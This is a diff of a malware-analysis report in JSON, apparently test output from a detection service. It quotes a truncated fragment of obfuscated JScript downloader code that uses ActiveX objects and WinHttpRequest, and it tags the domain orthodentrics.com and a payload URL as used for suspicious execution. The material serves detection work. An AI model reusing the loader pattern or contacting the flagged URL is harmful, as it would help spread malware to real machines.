@@ -18,7 +18,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\tvar _d = _0x4b[18]\n\t\tvar _e = _0x4b[19]\n\t\tvar _f = _0x4b[20]\n\t\t_b[_0x4b[5]](_0x4b[4], _e, false)\n\t\t_b[_0x4b[6]]()\n\t\tvar _g = new ActiveXObject(_0x4b[9])\n\t\t[6 Mark(s) Truncated]",
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x4b = [\"\\\\ProgramData\\\\\", \"Scripting.FileSystemObject\", \"WinHttp.WinHttpRequest.5.1\", \"WScript...\n\t\tvar _a = new ActiveXObject(_0x4b[1])\n\t\tvar _b = new ActiveXObject(_0x4b[2])\n\t\tvar _c = new ActiveXObject(_0x4b[3])\n\t\tvar _d = _0x4b[18]\n\t\tvar _e = _0x4b[19]\n\t\tvar _f = _0x4b[20]\n\t\t_b[_0x4b[5]](_0x4b[4], _e, false)\n\t\t_b[_0x4b[6]]()\n\t\tif (_b[_0x4b[7]] == 200) {\n\t\t[9 Mark(s) Truncated]",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -316,7 +316,7 @@
         "promote_to": null,
         "tags": {
           "network": {
-            "dynamic": {
+            "static": {
               "domain": [
                 "orthodentrics.com"
               ],
@@ -422,37 +422,17 @@
       }
     ],
     "tags": {
-      "network.dynamic.domain": [
-        {
-          "heur_id": 1,
-          "signatures": [
-            "url_used_for_suspicious_exec"
-          ],
-          "value": "orthodentrics.com"
-        }
-      ],
-      "network.dynamic.uri": [
-        {
-          "heur_id": 1,
-          "signatures": [
-            "url_used_for_suspicious_exec"
-          ],
-          "value": "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
-        }
-      ],
-      "network.dynamic.uri_path": [
-        {
-          "heur_id": 1,
-          "signatures": [
-            "url_used_for_suspicious_exec"
-          ],
-          "value": "/8GE/fdsfdsfewwwe23"
-        }
-      ],
       "network.static.domain": [
         {
           "heur_id": 2,
           "signatures": [],
+          "value": "orthodentrics.com"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [
+            "url_used_for_suspicious_exec"
+          ],
           "value": "orthodentrics.com"
         }
       ],
@@ -461,12 +441,26 @@
           "heur_id": 2,
           "signatures": [],
           "value": "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [
+            "url_used_for_suspicious_exec"
+          ],
+          "value": "https://orthodentrics.com/8GE/fdsfdsfewwwe23"
         }
       ],
       "network.static.uri_path": [
         {
           "heur_id": 2,
           "signatures": [],
+          "value": "/8GE/fdsfdsfewwwe23"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [
+            "url_used_for_suspicious_exec"
+          ],
           "value": "/8GE/fdsfdsfewwwe23"
         }
       ]
